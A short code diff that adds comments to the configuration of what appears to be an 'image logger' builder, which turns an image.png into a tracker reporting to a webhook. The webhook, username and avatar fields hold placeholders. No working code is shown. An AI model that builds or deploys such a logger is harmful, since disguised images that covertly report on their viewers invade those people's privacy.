@@ -1,3 +1,5 @@
+-- // The exe file will build the image with this configuration:
+--// The image logger will be saved as image.png
 webhook = "WEBHOOK HERE"
 username = "Username of the webhook"
 avatar_url = "Avatar of the webhook"
